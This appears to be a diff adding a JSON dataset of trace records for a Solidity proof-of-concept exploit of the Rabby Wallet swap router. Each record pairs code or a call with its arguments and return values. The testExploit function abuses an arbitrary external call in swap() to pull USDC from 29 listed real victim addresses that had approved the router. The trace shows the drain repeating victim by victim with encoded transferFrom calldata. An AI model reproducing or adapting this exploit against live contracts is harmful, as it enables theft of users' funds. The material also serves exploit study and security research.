@@ -1,0 +1,2739 @@
+[
+    {
+        "id": "1549721",
+        "args": "",
+        "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\n            \"[Start] Attacker USDC balance before exploit\", USDC_TOKEN.balanceOf(address(this)), 6\n        );\n\n        // Somehow attacker got these EOA addresses that approved the Rabby Wallet Swap Router contract.\n        // ...Maybe the attacker grepped the history Txs and found those victims that interacted with the Swap Router contract.\n        address[29] memory victims = [\n            0x94228872bb16CBCDfe010c42a8e456d15B366bF1,\n            0x6a3BCee1eBeBDaA099a46d21a355D0FF1C521fCB,\n            0xDAcCce559a0571083556f39d05b177579613D83b,\n            0x720610ed4925676D971B0ae5b3080bd233E19038,\n            0xf9e1D1e9F22c96752356AdFd377231528c7E851E,\n            0xAF22b1692dEe5929952cFBA4D9a74c0952C712C8,\n            0xFcdB212E7e7588D2dd2cc44C30F6C79fB507DB4B,\n            0x9A93C5f7680724F6b7097085B0052A56D80615Bd,\n            0x491968b05D95979BA3a52D73D8a39EA96693f011,\n            0xc64284527B04A48c6673dF62f5B48188Ccfdf658,\n            0x9df99a08710615FaBcb16Ea0b05ED039e8a5F644,\n            0xc897967Bab363caDD4F3001d51506bCc5DD6f6C2,\n            0x48aa9d67cb713804C005516BCa7769c159d7897C,\n            0xB9AFb68de4E1f89acA813ca75d87bd86a1a17aa3,\n            0xC10898edA672fDFc4Ac0228bB1Da9b2bF54C768f,\n            0x73B37009778048f6dB88fD602582473e74e5019a,\n            0xbB4b297cC5257D8ab7F280361C96b3A27014EbBb,\n            0x5BE2539BaA7622865FDc401bA26adB636d78f5Bf,\n            0x25939E70Dc19ef0aa2819f5c6544712a36eEbfa7,\n            0x5853eD4f26A3fceA565b3FBC698bb19cdF6DEB85,\n            0x73a6b16aD155aCd15F1A69e61369DB883dFC0b0b,\n            0xE451DC0948F33B1261c585f0DB84cca9Ab69F3A4,\n            0xd38023D7Ee559672fA00eA5156734710bcc0e781,\n            0x059c1592696D430E7bA8cccC984BA9639b8CF90B,\n            0x69AfE88F22F416fFB7d2Bf119b31EBc0D0d85325,\n            0xD506Fb416B0ad8DBf7859B9B38c435405E3d1110,\n            0xe7b6804A9fE8aDEb109112A8A2CF40093E0d55fc,\n            0xeEBbAf298bb8B5076723d69AF61bf75a5C2ad8d6,\n            0x1Fc550e98aD3021e32C47A84019F77a0792c60B7\n        ];\n\n        for (uint256 i; i < victims.length; ++i) {\n            // Step 1: Check the victim's USDC balance and allowance to RABBYSWAP_ROUTER\n            uint256 vic_balance = USDC_TOKEN.balanceOf(victims[i]);\n            uint256 vic_allowance = USDC_TOKEN.allowance(victims[i], address(RABBYSWAP_ROUTER));\n\n            // Step 2: If allowance >= balance: exploit!\n            if (vic_allowance >= vic_balance) {\n                // Classic arbitrary external calls `swap()` vulnerability, and the parameter `address dexRouter` is controllable.\n                bytes memory usdc_callbackData = abi.encodeWithSignature(\n                    \"transferFrom(address,address,uint256)\", victims[i], address(this), vic_balance\n                );\n                RABBYSWAP_ROUTER.swap(\n                    address(USDT_TOKEN),\n                    0,\n                    address(this),\n                    4660,\n                    address(USDC_TOKEN),\n                    address(USDC_TOKEN),\n                    usdc_callbackData,\n                    block.timestamp\n                );\n            }\n",
+        "description": "1. **Core functions:**\n   The `testExploit` function is designed to simulate an attack where the attacker checks a list of victim addresses to see if they have approved a specific swap router contract to spend their USDC tokens. If the allowance (the amount the victim has approved for the router to spend) is greater than or equal to the victim's USDC balance, the attacker exploits this by using the router's `swap` function to transfer the victim's USDC tokens to the attacker's address.\n\n2. **Security mechanism:**\n   The function does not include explicit security mechanisms to prevent unauthorized access or misuse. Instead, it relies on the assumption that the attacker has access to a list of victim addresses and that these victims have already approved the swap router to spend their USDC tokens. The function emits a log at the beginning to record the attacker's USDC balance before the exploit, which could be used for auditing purposes.\n\n3. **Parameter Function:**\n   - `victims`: An array of 29 addresses representing the victims whose USDC balances and allowances are checked.\n   - `vic_balance`: The USDC balance of each victim.\n   - `vic_allowance`: The amount of USDC each victim has approved for the swap router to spend.\n   - `usdc_callbackData`: Encoded data for the `transferFrom` function, which is used to transfer USDC from the victim to the attacker.\n   - `RABBYSWAP_ROUTER.swap`: The swap function is called with various parameters, including the victim's address, the attacker's address, and the amount of USDC to transfer.\n\n4. **Return description:**\n   The function does not return any value. Instead, it performs actions based on the conditions met during the execution. If a victim's allowance is greater than or equal to their USDC balance, the function triggers the `swap` function to transfer the victim's USDC to the attacker. The function emits a log at the beginning to record the attacker's USDC balance before the exploit, but it does not calculate or return any output value.\n\n**In summary,**\nThe `testExploit` function simulates an attack where the attacker checks a list of victim addresses to see if they have approved a specific swap router to spend their USDC tokens. If the allowance is sufficient, the attacker uses the router's `swap` function to transfer the victim's USDC to their own address. The function does not include explicit security mechanisms and does not return any value, focusing instead on executing the exploit based on the conditions met.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "9815",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": "    function balanceOf(\n        address\n    ) external pure returns (uint256) {\n        return 100e18;\n    }\n\n",
+        "description": "1. **Core function:**  \n   The `balanceOf` function is designed to return a fixed balance value of 100e18 (which represents 100 tokens with 18 decimal places) for any address provided as input. It does not actually check or retrieve the real balance of the address; instead, it always returns the same value.\n\n2. **Security mechanism:**  \n   The function uses the `pure` modifier, which ensures that it does not read or modify the state of the blockchain. This makes it safe from any external manipulation or state changes. However, since it returns a fixed value, it does not provide any real-world security or utility for checking actual token balances.\n\n3. **Parameter Function:**  \n   The function takes one parameter, an `address`, which represents the wallet or account whose balance is being queried. However, the function does not use this parameter in its logic; it simply ignores it and always returns the same value.\n\n4. **Return description:**  \n   The function always returns the value `100e18`, which is a fixed number representing 100 tokens with 18 decimal places. This value is hardcoded and does not depend on any input or external data.\n\n**In summary,**  \nThe `balanceOf` function is a simple, hardcoded function that returns a fixed balance of 100 tokens for any address provided. It does not interact with the blockchain state or use the input address, making it purely a placeholder or example function.",
+        "return_value": "0"
+    },
+    {
+        "id": "2529",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "3315",
+        "args": "0x94228872bb16CBCDfe010c42a8e456d15B366bF1",
+        "original_code": null,
+        "description": null,
+        "return_value": "2359761080 [2.359e9]"
+    },
+    {
+        "id": "2529",
+        "args": "0x94228872bb16CBCDfe010c42a8e456d15B366bF1",
+        "original_code": null,
+        "description": null,
+        "return_value": "2359761080 [2.359e9]"
+    },
+    {
+        "id": "3426",
+        "args": "0x94228872bb16CBCDfe010c42a8e456d15B366bF1, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007910652646170 [1.157e77]"
+    },
+    {
+        "id": "2637",
+        "args": "0x94228872bb16CBCDfe010c42a8e456d15B366bF1, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007910652646170 [1.157e77]"
+    },
+    {
+        "id": "97026",
+        "args": "USDT_TOKEN: [0xdAC17F958D2ee523a2206206994597C13D831ec7], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4660, USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0x23b872dd00000000000000000000000094228872bb16cbcdfe010c42a8e456d15b366bf10000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000008ca718b8, 1665486251 [1.665e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "21258",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "3356",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "39492",
+        "args": "0x94228872bb16CBCDfe010c42a8e456d15B366bF1, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2359761080 [2.359e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "38697",
+        "args": "0x94228872bb16CBCDfe010c42a8e456d15B366bF1, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2359761080 [2.359e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "708",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "100000000000000000000 [1e20]"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": "    function transfer(address, uint256) external pure returns (bool) {\n        return true;\n    }\n\n",
+        "description": "1. **Core functions:**  \n   The core function of this code is to simulate a token transfer operation. It is designed to accept an address and an amount as inputs and always return `true`, indicating that the transfer was successful. However, it does not actually perform any real transfer of tokens or modify any state.\n\n2. **Security mechanism:**  \n   The function uses the `external` and `pure` modifiers. The `external` modifier ensures the function can only be called from outside the contract, while the `pure` modifier guarantees that the function does not read or modify the contract's state. These measures ensure the function is isolated and does not interact with the contract's data, reducing potential risks.\n\n3. **Parameter Function:**  \n   The function takes two parameters:  \n   - `address`: Represents the recipient's address where the tokens are intended to be sent.  \n   - `uint256`: Represents the amount of tokens to be transferred.  \n   These parameters are placeholders and are not used in the function's logic.\n\n4. **Return description:**  \n   The function always returns `true`, regardless of the input values. This is a hardcoded response that simulates a successful transfer without performing any actual operations.\n\n**In summary,**  \nThis function is a placeholder that mimics a token transfer by always returning `true`. It does not execute any real transfer logic or interact with the contract's state, making it a simple and safe but non-functional implementation.",
+        "return_value": "true"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3315",
+        "args": "0x6a3BCee1eBeBDaA099a46d21a355D0FF1C521fCB",
+        "original_code": null,
+        "description": null,
+        "return_value": "1684833919 [1.684e9]"
+    },
+    {
+        "id": "2529",
+        "args": "0x6a3BCee1eBeBDaA099a46d21a355D0FF1C521fCB",
+        "original_code": null,
+        "description": null,
+        "return_value": "1684833919 [1.684e9]"
+    },
+    {
+        "id": "3426",
+        "args": "0x6a3BCee1eBeBDaA099a46d21a355D0FF1C521fCB, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]"
+    },
+    {
+        "id": "2637",
+        "args": "0x6a3BCee1eBeBDaA099a46d21a355D0FF1C521fCB, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]"
+    },
+    {
+        "id": "42626",
+        "args": "USDT_TOKEN: [0xdAC17F958D2ee523a2206206994597C13D831ec7], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4660, USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0x23b872dd0000000000000000000000006a3bcee1ebebdaa099a46d21a355d0ff1c521fcb0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000646c867f, 1665486251 [1.665e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "5258",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1356",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "13592",
+        "args": "0x6a3BCee1eBeBDaA099a46d21a355D0FF1C521fCB, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1684833919 [1.684e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "12797",
+        "args": "0x6a3BCee1eBeBDaA099a46d21a355D0FF1C521fCB, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1684833919 [1.684e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "708",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "100000000000000000000 [1e20]"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3315",
+        "args": "0xDAcCce559a0571083556f39d05b177579613D83b",
+        "original_code": null,
+        "description": null,
+        "return_value": "457329751 [4.573e8]"
+    },
+    {
+        "id": "2529",
+        "args": "0xDAcCce559a0571083556f39d05b177579613D83b",
+        "original_code": null,
+        "description": null,
+        "return_value": "457329751 [4.573e8]"
+    },
+    {
+        "id": "3426",
+        "args": "0xDAcCce559a0571083556f39d05b177579613D83b, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007912829639935 [1.157e77]"
+    },
+    {
+        "id": "2637",
+        "args": "0xDAcCce559a0571083556f39d05b177579613D83b, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007912829639935 [1.157e77]"
+    },
+    {
+        "id": "42626",
+        "args": "USDT_TOKEN: [0xdAC17F958D2ee523a2206206994597C13D831ec7], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4660, USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0x23b872dd000000000000000000000000daccce559a0571083556f39d05b177579613d83b0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000001b424c57, 1665486251 [1.665e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "5258",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1356",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "13592",
+        "args": "0xDAcCce559a0571083556f39d05b177579613D83b, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 457329751 [4.573e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "12797",
+        "args": "0xDAcCce559a0571083556f39d05b177579613D83b, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 457329751 [4.573e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "708",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "100000000000000000000 [1e20]"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3315",
+        "args": "0x720610ed4925676D971B0ae5b3080bd233E19038",
+        "original_code": null,
+        "description": null,
+        "return_value": "362946921 [3.629e8]"
+    },
+    {
+        "id": "2529",
+        "args": "0x720610ed4925676D971B0ae5b3080bd233E19038",
+        "original_code": null,
+        "description": null,
+        "return_value": "362946921 [3.629e8]"
+    },
+    {
+        "id": "3426",
+        "args": "0x720610ed4925676D971B0ae5b3080bd233E19038, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007913029639935 [1.157e77]"
+    },
+    {
+        "id": "2637",
+        "args": "0x720610ed4925676D971B0ae5b3080bd233E19038, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007913029639935 [1.157e77]"
+    },
+    {
+        "id": "42626",
+        "args": "USDT_TOKEN: [0xdAC17F958D2ee523a2206206994597C13D831ec7], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4660, USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0x23b872dd000000000000000000000000720610ed4925676d971b0ae5b3080bd233e190380000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000015a22169, 1665486251 [1.665e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "5258",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1356",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "13592",
+        "args": "0x720610ed4925676D971B0ae5b3080bd233E19038, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 362946921 [3.629e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "12797",
+        "args": "0x720610ed4925676D971B0ae5b3080bd233E19038, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 362946921 [3.629e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "708",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "100000000000000000000 [1e20]"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3315",
+        "args": "0xf9e1D1e9F22c96752356AdFd377231528c7E851E",
+        "original_code": null,
+        "description": null,
+        "return_value": "309559183 [3.095e8]"
+    },
+    {
+        "id": "2529",
+        "args": "0xf9e1D1e9F22c96752356AdFd377231528c7E851E",
+        "original_code": null,
+        "description": null,
+        "return_value": "309559183 [3.095e8]"
+    },
+    {
+        "id": "3426",
+        "args": "0xf9e1D1e9F22c96752356AdFd377231528c7E851E, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007913109639935 [1.157e77]"
+    },
+    {
+        "id": "2637",
+        "args": "0xf9e1D1e9F22c96752356AdFd377231528c7E851E, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007913109639935 [1.157e77]"
+    },
+    {
+        "id": "42626",
+        "args": "USDT_TOKEN: [0xdAC17F958D2ee523a2206206994597C13D831ec7], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4660, USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0x23b872dd000000000000000000000000f9e1d1e9f22c96752356adfd377231528c7e851e0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000012737f8f, 1665486251 [1.665e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "5258",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1356",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "13592",
+        "args": "0xf9e1D1e9F22c96752356AdFd377231528c7E851E, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 309559183 [3.095e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "12797",
+        "args": "0xf9e1D1e9F22c96752356AdFd377231528c7E851E, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 309559183 [3.095e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "708",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "100000000000000000000 [1e20]"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3315",
+        "args": "0xAF22b1692dEe5929952cFBA4D9a74c0952C712C8",
+        "original_code": null,
+        "description": null,
+        "return_value": "30487586 [3.048e7]"
+    },
+    {
+        "id": "2529",
+        "args": "0xAF22b1692dEe5929952cFBA4D9a74c0952C712C8",
+        "original_code": null,
+        "description": null,
+        "return_value": "30487586 [3.048e7]"
+    },
+    {
+        "id": "3426",
+        "args": "0xAF22b1692dEe5929952cFBA4D9a74c0952C712C8, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]"
+    },
+    {
+        "id": "2637",
+        "args": "0xAF22b1692dEe5929952cFBA4D9a74c0952C712C8, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]"
+    },
+    {
+        "id": "42626",
+        "args": "USDT_TOKEN: [0xdAC17F958D2ee523a2206206994597C13D831ec7], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4660, USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0x23b872dd000000000000000000000000af22b1692dee5929952cfba4d9a74c0952c712c80000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000001d13422, 1665486251 [1.665e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "5258",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1356",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "13592",
